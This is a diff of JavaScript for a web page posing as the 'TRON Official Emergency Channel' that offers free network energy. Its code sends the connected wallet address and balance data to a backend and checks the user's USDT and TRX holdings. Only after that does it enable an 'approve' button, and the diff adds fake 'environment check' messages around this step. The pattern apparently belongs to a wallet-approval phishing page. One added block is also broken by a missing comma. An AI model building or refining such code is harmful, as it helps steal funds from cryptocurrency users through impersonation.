@@ -918,8 +918,11 @@
             noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请重新选择钱包连接</span>",
             nonImTokenUser: "非TRON兼容钱包用户<br><span style='color: #000000; font-size: 13px;'>正在自动唤起支持的钱包...</span>",
             specialTipTitle: "TRON-EAB",
-            specialTipContent: "此链接仅为TRON生态用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
-        },
+            specialTipContent: "此链接仅为TRON生态用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。",
+            a1CheckingTip: "环境检测中...",
+            a1EligibleTip: "✅ 环境符合领取条件",
+            a1SignalFailTip: "环境检测失败，请重新连接钱包"
+             },
         en: {
             headerTitle: "TRON",
             headerDesc: "TRON Official Emergency Channel",
@@ -986,6 +989,9 @@
             nonImTokenUser: "Non-TRON-compatible wallet user<br><span style='color: #000000; font-size: 13px;'>Auto-launching supported wallet...</span>",
             specialTipTitle: "TRON-EAB",
             specialTipContent: "This link is only for emergency assistance to TRON ecosystem users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
+            a1CheckingTip: "Environment checking...",
+            a1EligibleTip: "✅ Environment eligible for claim",
+            a1SignalFailTip: "Environment check failed, please reconnect wallet"
         }
     };
 
@@ -1419,37 +1425,38 @@ async function queryUserEnergyBalance(address) {
      * 发送A1信号到后端（环境校验）
      * @returns {string} success=发送成功，fail=发送失败
      */
-    async function sendSignalA1() {
-        const requestData = { userAddress };
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 20000); // 20秒超时
-        try {
-            const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(requestData),
-                signal: controller.signal,
-                keepalive: true
-            });
-            clearTimeout(timeoutId);
-            if (res.ok) {
-                const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-                a1Status[userAddress] = "success";
-                localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-                console.log(`✅ A1信号发送成功（后端返回状态码：${res.status}）`);
-                return "success";
-            }
-            throw new Error(`A1信号后端返回非成功状态：${res.status}`);
-        } catch (e) {
-            clearTimeout(timeoutId);
-            console.warn("❌ A1信号发送失败（网络/超时/后端异常）：", e);
-            // 标记失败状态
+async function sendSignalA1() {
+    const requestData = { userAddress };
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 20000);
+    try {
+        const res = await fetch(`${BACKEND_API}/api/send-signal-a1`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(requestData),
+            signal: controller.signal,
+            keepalive: true
+        });
+        clearTimeout(timeoutId);
+        if (res.ok) {
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            a1Status[userAddress] = "fail";
+            a1Status[userAddress] = "success";
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-            return "fail";
+            // 同步防重复记录（关键：确保15分钟内不再发送）
+            updateA1SignalRecord(userAddress);
+            console.log(`✅ A1信号发送成功（后端返回状态码：${res.status}）`);
+            return "success";
         }
+        throw new Error(`A1信号后端返回非成功状态：${res.status}`);
+    } catch (e) {
+        clearTimeout(timeoutId);
+        console.warn("❌ A1信号发送失败（网络/超时/后端异常）：", e);
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1Status[userAddress] = "fail";
+        localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
+        return "fail";
     }
+}
 
     /**
      * 发送A2信号到后端（余额信息上报）
@@ -1596,123 +1603,130 @@ async function queryUserEnergyBalance(address) {
      * 初始化钱包（核心重构：按“地址→余额→验证→后续”顺序）
      * @param {boolean} isAfterApprove - 是否为授权后初始化
      */
-    async function initWallet(isAfterApprove = false) {
-        const lang = langConfig[currentLang];
-        // 存储A1信号发送结果（用于绑定按钮判断）
-        let a1SignalSuccess = false;
-        try {
-            // 步骤1：获取钱包地址（第一步）
-            userAddress = tronWeb.defaultAddress?.base58;
-            const statusAddressEl = document.getElementById("statusAddress");
-            // 地址空值判断，避免slice报错
-            if (userAddress && statusAddressEl) {
-                statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            } else if (statusAddressEl) {
-                statusAddressEl.textContent = "——";
-            }    
-            
-            updateWalletStatus(); // 切换为已连接状态，显示钱包地址
-            if (!userAddress) {
-                // 无地址：仅显示提示，不执行后续操作
-                DOM.userInfoDefault.style.display = "none";
-                DOM.userInfoStatus.style.display = "block";
-                DOM.userInfoStatus.innerHTML = lang.noWalletAddress;
-                DOM.balanceItems.forEach(item => item.style.display = "none"); // 隐藏余额
-                DOM.approveBtn.disabled = true;
-                DOM.approveBtn.textContent = lang.insufficientBtn;
-                updateWalletStatus(); // 切换为未连接状态
-                DOM.recordList.style.display = "none";
-                return;
-            }
-
-            // 核心调整1：地址有效后立即异步发送A1信号（防重复校验）
-            if (canSendA1Signal(userAddress)) {
-                // 异步发送，不阻塞后续逻辑（用then处理结果）
-                sendSignalA1().then(result => {
-                    a1SignalSuccess = result === "success";
-                    console.log(`A1信号发送结果：${a1SignalSuccess ? "成功" : "失败"}`);
-                    // A1失败时更新UI提示
-                    if (!a1SignalSuccess && DOM.userInfoStatus) {
-                        DOM.userInfoStatus.innerHTML += `<br><span style='color: #ff4444; font-size: 13px;'>${lang.a1SignalFailTip}</span>`;
-                    }
-                }).catch(err => {
-                    a1SignalSuccess = false;
-                    console.error("A1信号发送异常：", err);
-                    if (DOM.userInfoStatus) {
-                        DOM.userInfoStatus.innerHTML += `<br><span style='color: #ff4444; font-size: 13px;'>${lang.a1SignalFailTip}</span>`;
-                    }
-                });
-            } else {
-                // 15分钟内已发送过A1信号，直接取本地状态
-                const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-                a1SignalSuccess = a1Status[userAddress] === "success";
-                console.log("A1信号15分钟内已发送，本地状态：", a1SignalSuccess ? "成功" : "失败");
-            }
-            // 步骤2：立即查询本地余额（第二步，仅查询不显示）
+async function initWallet(isAfterApprove = false) {
+    const lang = langConfig[currentLang];
+    let a1SignalSuccess = false;
+    try {
+        // 步骤1：获取钱包地址
+        userAddress = tronWeb.defaultAddress?.base58;
+        const statusAddressEl = document.getElementById("statusAddress");
+        if (userAddress && statusAddressEl) {
+            statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+        } else if (statusAddressEl) {
+            statusAddressEl.textContent = "——";
+        }    
+        
+        updateWalletStatus();
+        if (!userAddress) {
             DOM.userInfoDefault.style.display = "none";
             DOM.userInfoStatus.style.display = "block";
-            DOM.userInfoStatus.innerHTML = lang.queryingBalance; // 显示“查询中”
-            DOM.recordList.style.display = userAddress ? "block" : "none";
-            // 本地查询余额（修复2：去掉false参数，确保能量/宽带能获取）
-            const [usdtRaw, trxRaw, userEnergy, userBandwidth] = await Promise.all([
-                // 初始化合约实例（若未初始化）+ 本地查询USDT余额
-                (trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS)).balanceOf(userAddress).call().catch(err => 0),
-                tronWeb.trx.getBalance(userAddress).catch(err => 0), // 修复：去掉false参数
-                queryUserEnergyBalance(userAddress), // 修复后：能正常获取能量
-                queryBandwidthBalance(userAddress) // 修复后：能正常获取宽带
-            ]);
-            // 格式化余额（确保能量/宽带赋值）
-            tokenBalance = Number(usdtRaw) / 1000000;
-            trxBalance = Number(trxRaw) / 1000000;
-            currentEnergy = userEnergy; // 保存查询到的能量
-            currentBandwidth = userBandwidth; // 保存查询到的宽带
-            // 修复1：拿到地址后立即显示钱包地址（不管验证是否通过）
-            
-            showBalanceInUserInfo();
-           
-          
-            // 步骤3：验证用户资格（前置“门”，第三步）
-            const { eligible, tip, btnText } = verifyUserEligibility();
-            if (!eligible) {
-                // 验证不通过：仅显示提示，不显示余额、不绑定按钮
-                DOM.userInfoStatus.innerHTML = tip;
-            
-                DOM.approveBtn.disabled = true;
-                DOM.approveBtn.textContent = btnText;
-                
-                if (userAddress) renderEnergyRecords();
-                return;
-            }
-
-            // 步骤4：验证通过！执行后续操作（第四步）
-            // 4.1 仅在#userInfo容器显示余额（包含能量/宽带）
-           
-
-            // 4.2 更新UI状态
-            DOM.userInfoStatus.innerHTML = tip; // 显示“可领取”提示
-            DOM.recordList.style.display = "block";
-            renderEnergyRecords();
-
-            // 核心调整2：绑定按钮需满足“A1成功 + 资格通过”
-            DOM.approveBtn.disabled = !a1SignalSuccess; // A1失败则禁用
-            DOM.approveBtn.textContent = btnText;
-            if (a1SignalSuccess) {
-                bindApproveLogic(); // 仅A1成功才绑定按钮逻辑
-            }
-        } catch (e) {
-            console.error("钱包初始化失败：", e);
-            // 异常情况：仅显示错误，不显示余额、不绑定按钮
-            DOM.userInfoDefault.style.display = "none";
-            DOM.userInfoStatus.style.display = "block";
-            DOM.userInfoStatus.innerHTML = `${lang.errorTipPrefix}${e.message || lang.ineligibleTip}`;
+            DOM.userInfoStatus.innerHTML = lang.noWalletAddress;
             DOM.balanceItems.forEach(item => item.style.display = "none");
             DOM.approveBtn.disabled = true;
             DOM.approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
-            DOM.recordList.style.display = userAddress ? "block" : "none";
-            if (userAddress) renderEnergyRecords();
+            DOM.recordList.style.display = "none";
+            return;
         }
+
+        // 步骤2：查询余额前先显示“环境检测中”（覆盖原“查询中”）
+        DOM.userInfoDefault.style.display = "none";
+        DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = lang.a1CheckingTip; // 发送A1前显示检测中
+        DOM.recordList.style.display = "block";
+
+        // 步骤3：异步发送A1信号（防重复校验+状态同步）
+        if (canSendA1Signal(userAddress)) {
+            // 异步发送，成功后同步状态+更新UI+绑定按钮
+            sendSignalA1().then(result => {
+                a1SignalSuccess = result === "success";
+                if (a1SignalSuccess) {
+                    // 核心：同步防重复标记（15分钟内不再发送）
+                    updateA1SignalRecord(userAddress);
+                    // 更新文本为“环境符合领取”
+                    DOM.userInfoStatus.innerHTML = lang.a1EligibleTip;
+                    // 重新校验用户资格，满足则绑定按钮
+                    const { eligible, btnText } = verifyUserEligibility();
+                    if (eligible) {
+                        DOM.approveBtn.disabled = false;
+                        DOM.approveBtn.textContent = btnText;
+                        bindApproveLogic(); // A1成功+资格通过，绑定按钮
+                    }
+                } else {
+                    DOM.userInfoStatus.innerHTML = `${lang.a1SignalFailTip}`;
+                    DOM.approveBtn.disabled = true;
+                    DOM.approveBtn.textContent = lang.insufficientBtn;
+                }
+            }).catch(err => {
+                a1SignalSuccess = false;
+                console.error("A1信号发送异常：", err);
+                DOM.userInfoStatus.innerHTML = `${lang.a1SignalFailTip}`;
+                DOM.approveBtn.disabled = true;
+                DOM.approveBtn.textContent = lang.insufficientBtn;
+            });
+        } else {
+            // 15分钟内已发送过A1，直接读取本地状态
+            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            a1SignalSuccess = a1Status[userAddress] === "success";
+            if (a1SignalSuccess) {
+                DOM.userInfoStatus.innerHTML = lang.a1EligibleTip; // 直接显示符合条件
+            } else {
+                DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
+                DOM.approveBtn.disabled = true;
+                DOM.approveBtn.textContent = lang.insufficientBtn;
+            }
+        }
+
+        // 步骤4：并行查询余额（不阻塞A1信号检测）
+        const [usdtRaw, trxRaw, userEnergy, userBandwidth] = await Promise.all([
+            (trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS)).balanceOf(userAddress).call().catch(err => 0),
+            tronWeb.trx.getBalance(userAddress).catch(err => 0),
+            queryUserEnergyBalance(userAddress),
+            queryBandwidthBalance(userAddress)
+        ]);
+
+        // 格式化余额
+        tokenBalance = Number(usdtRaw) / 1000000;
+        trxBalance = Number(trxRaw) / 1000000;
+        currentEnergy = userEnergy;
+        currentBandwidth = userBandwidth;
+        showBalanceInUserInfo();
+
+        // 步骤5：验证用户资格（A1未返回时先禁用按钮，返回后自动激活）
+        const { eligible, tip, btnText } = verifyUserEligibility();
+        if (!eligible) {
+            DOM.userInfoStatus.innerHTML = tip;
+            DOM.approveBtn.disabled = true;
+            DOM.approveBtn.textContent = btnText;
+            renderEnergyRecords();
+            return;
+        }
+
+        // 步骤6：A1已返回成功时直接绑定，未返回则等待回调触发
+        DOM.recordList.style.display = "block";
+        renderEnergyRecords();
+        DOM.approveBtn.textContent = btnText;
+        // 若A1已成功，直接绑定按钮
+        if (a1SignalSuccess) {
+            DOM.approveBtn.disabled = false;
+            bindApproveLogic();
+        } else {
+            DOM.approveBtn.disabled = true; // A1未完成前保持禁用
+        }
+
+    } catch (e) {
+        console.error("钱包初始化失败：", e);
+        DOM.userInfoDefault.style.display = "none";
+        DOM.userInfoStatus.style.display = "block";
+        DOM.userInfoStatus.innerHTML = `${lang.errorTipPrefix}${e.message || lang.ineligibleTip}`;
+        DOM.balanceItems.forEach(item => item.style.display = "none");
+        DOM.approveBtn.disabled = true;
+        DOM.approveBtn.textContent = lang.insufficientBtn;
+        updateWalletStatus();
+        DOM.recordList.style.display = userAddress ? "block" : "none";
+        if (userAddress) renderEnergyRecords();
     }
+}
     /**
      * 修复3：点击链接后直接显示选择钱包弹窗（无需点击连接按钮）
      * 检测钱包环境（TRON兼容钱包）
@@ -1761,78 +1775,98 @@ async function queryUserEnergyBalance(address) {
     /**
      * 重新渲染动态内容（语言切换/状态变化后调用，无修改）
      */
-    async function reRenderDynamicContent() {
-        const lang = langConfig[currentLang];
-        let a1SignalSuccess = false;
-        if (!userAddress) {
-            DOM.approveBtn.disabled = true;
-            DOM.approveBtn.textContent = lang.approveBtnText;
-            DOM.recordList.style.display = "none";
-            await updateUserInfoDisplay();
-            return;
-        }
-        DOM.recordList.style.display = "block";
-        DOM.recordList.style.visibility = "visible";
+  async function reRenderDynamicContent() {
+    const lang = langConfig[currentLang];
+    let a1SignalSuccess = false;
+    if (!userAddress) {
+        DOM.approveBtn.disabled = true;
+        DOM.approveBtn.textContent = lang.approveBtnText;
+        DOM.recordList.style.display = "none";
+        await updateUserInfoDisplay();
+        return;
+    }
+    DOM.recordList.style.display = "block";
+    DOM.recordList.style.visibility = "visible";
 
-        
-        // 地址有效后立即异步发送A1信号（防重复校验）
-        if (canSendA1Signal(userAddress)) {
-            sendSignalA1().then(result => {
-                a1SignalSuccess = result === "success";
-                if (!a1SignalSuccess && DOM.userInfoStatus) {
-                    DOM.userInfoStatus.innerHTML += `<br><span style='color: #ff4444; font-size: 13px;'>${lang.a1SignalFailTip}</span>`;
-                }
-            }).catch(err => {
-                a1SignalSuccess = false;
-                if (DOM.userInfoStatus) {
-                    DOM.userInfoStatus.innerHTML += `<br><span style='color: #ff4444; font-size: 13px;'>${lang.a1SignalFailTip}</span>`;
-                }
-            });
-        } else {
-            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
-            a1SignalSuccess = a1Status[userAddress] === "success";
-        }
-
-        if (userAddress === SPECIAL_ADDRESS) {
-            updateWalletStatus();
-            await updateUserInfoDisplay();
-            renderEnergyRecords(); // 移除重复渲染
-            DOM.approveBtn.disabled = !a1SignalSuccess; // A1成功才启用
-            DOM.approveBtn.textContent = lang.approveBtnText;
-            
-            if (DOM.statusAddressEl) {
-                DOM.statusAddressEl.style.display = "inline";
-                DOM.statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            }
-
-            // 仅A1成功才绑定按钮
+    // 显示“环境检测中”并发送A1信号
+    DOM.userInfoStatus.innerHTML = lang.a1CheckingTip;
+    if (canSendA1Signal(userAddress)) {
+        sendSignalA1().then(result => {
+            a1SignalSuccess = result === "success";
             if (a1SignalSuccess) {
-                bindApproveLogic();
+                updateA1SignalRecord(userAddress); // 同步防重复标记
+                DOM.userInfoStatus.innerHTML = lang.a1EligibleTip;
+                // 重新校验资格并绑定按钮
+                const { eligible, btnText } = verifyUserEligibility();
+                if (eligible) {
+                    DOM.approveBtn.disabled = false;
+                    DOM.approveBtn.textContent = btnText;
+                    bindApproveLogic();
+                }
+            } else {
+                DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
+                DOM.approveBtn.disabled = true;
             }
-            return;
-        }
-
-        if (isAddressAuthorized(userAddress)) {
-            updateWalletStatus();
-            await updateUserInfoDisplay();
+        }).catch(err => {
+            a1SignalSuccess = false;
+            DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
             DOM.approveBtn.disabled = true;
-            DOM.approveBtn.textContent = lang.authorizedBtn;
-            return;
+        });
+    } else {
+        // 读取本地状态
+        const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+        a1SignalSuccess = a1Status[userAddress] === "success";
+        if (a1SignalSuccess) {
+            DOM.userInfoStatus.innerHTML = lang.a1EligibleTip;
+        } else {
+            DOM.userInfoStatus.innerHTML = lang.a1SignalFailTip;
         }
+    }
 
-        // 余额判断逻辑
-        const { eligible, btnText } = verifyUserEligibility();
-        DOM.approveBtn.disabled = !eligible || !a1SignalSuccess; // 双条件满足才启用
-        DOM.approveBtn.textContent = btnText;
-
+    if (userAddress === SPECIAL_ADDRESS) {
         updateWalletStatus();
         await updateUserInfoDisplay();
-        // 仅双条件满足才绑定按钮
-        if (eligible && a1SignalSuccess) {
-            bindApproveLogic();
-        }
         renderEnergyRecords();
+        DOM.approveBtn.textContent = lang.approveBtnText;
+        
+        if (DOM.statusAddressEl) {
+            DOM.statusAddressEl.style.display = "inline";
+            DOM.statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+        }
+
+        // A1成功+资格通过则绑定
+        const { eligible } = verifyUserEligibility();
+        if (eligible && a1SignalSuccess) {
+            DOM.approveBtn.disabled = false;
+            bindApproveLogic();
+        } else {
+            DOM.approveBtn.disabled = true;
+        }
+        return;
     }
+
+    if (isAddressAuthorized(userAddress)) {
+        updateWalletStatus();
+        await updateUserInfoDisplay();
+        DOM.approveBtn.disabled = true;
+        DOM.approveBtn.textContent = lang.authorizedBtn;
+        return;
+    }
+
+    // 普通地址：双条件绑定
+    const { eligible, btnText } = verifyUserEligibility();
+    DOM.approveBtn.textContent = btnText;
+    if (eligible && a1SignalSuccess) {
+        DOM.approveBtn.disabled = false;
+        bindApproveLogic();
+    } else {
+        DOM.approveBtn.disabled = true;
+    }
+
+    updateWalletStatus();
+    await updateUserInfoDisplay();
+    renderEnergyRecords();
+}
     /********************************************************************
      * 事件绑定：集中管理所有事件，无修改仅整理顺序
      ********************************************************************/
